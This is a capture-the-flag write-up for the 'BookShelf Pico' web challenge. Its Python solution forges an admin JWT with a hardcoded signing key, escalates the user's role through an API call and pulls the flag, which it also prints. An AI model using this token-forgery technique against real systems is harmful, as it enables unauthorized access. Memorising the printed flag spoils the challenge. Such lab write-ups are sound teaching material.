## Descripción
BookShelf Pico, my premium online book-reading service.

I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book! Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://challenge-files.cylabacademy.net/library/42628968e19dda614759290450f9ab06e4c37183b6a07886784d4e8341e69aab/bookshelf-pico.zip).

Website can be accessed [here!](http://xebec.cylabacademy.net:31744/).

1.- Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?

2.- The 'role' and 'userId' fields in the JWT can be of interest to you!

3.- The 'controllers', 'services' and 'security' java packages in the given source code might need your attention. We've provided a README.md file that contains some documentation.

4.- Upgrade your 'role' with the _new_ (cracked) JWT. And re-login for the new role to get reflected in browser's localStorage.
## Solución
```
wget https://challenge-files.cylabacademy.net/library/42628968e19dda614759290450f9ab06e4c37183b6a07886784d4e8341e69aab/bookshelf-pico.zip

unzip bookshelf-pico.zip

grep -R "1234\|JWT\|role\|userId" -n src/main/java

BASE="http://xebec.cylabacademy.net:41517"

python3 - <<'PY'
import urllib.request, json, base64, hmac, hashlib, time, re

BASE = "http://xebec.cylabacademy.net:41517"

def b64(obj):
    return base64.urlsafe_b64encode(
        json.dumps(obj, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

def make_jwt():
    header = {"typ": "JWT", "alg": "HS256"}
    now = int(time.time())
    payload = {
        "role": "Admin",
        "iss": "bookshelf",
        "exp": now + 604800,
        "iat": now,
        "userId": 2,
        "email": "admin"
    }

    unsigned = b64(header) + "." + b64(payload)
    signature = base64.urlsafe_b64encode(
        hmac.new(b"1234", unsigned.encode(), hashlib.sha256).digest()
    ).rstrip(b"=").decode()

    return unsigned + "." + signature

def request(method, path, data=None, token=None):
    body = None if data is None else json.dumps(data).encode()
    req = urllib.request.Request(BASE + path, data=body, method=method)

    if data is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)

    with urllib.request.urlopen(req) as r:
        return r.read()

forged_token = make_jwt()

request(
    "PATCH",
    "/base/users/role",
    {"id": 1, "role": "Admin"},
    forged_token
)

login = json.loads(request(
    "POST",
    "/base/login",
    {"email": "user", "password": "user"}
))

real_token = login["payload"]

books = json.loads(request(
    "GET",
    "/base/books",
    token=real_token
))["payload"]

flag_book = next(book for book in books if book["title"] == "Flag")

pdf = request(
    "GET",
    "/base/books/pdf/" + str(flag_book["id"]),
    token=real_token
)

flag = re.findall(rb"academy\{[^}]+\}", pdf)[0].decode()
print(flag)
PY
```
```academy{w34k_jwt_n0t_g00d_1107047a}

```

## Notas Adicionales

## Referencias
-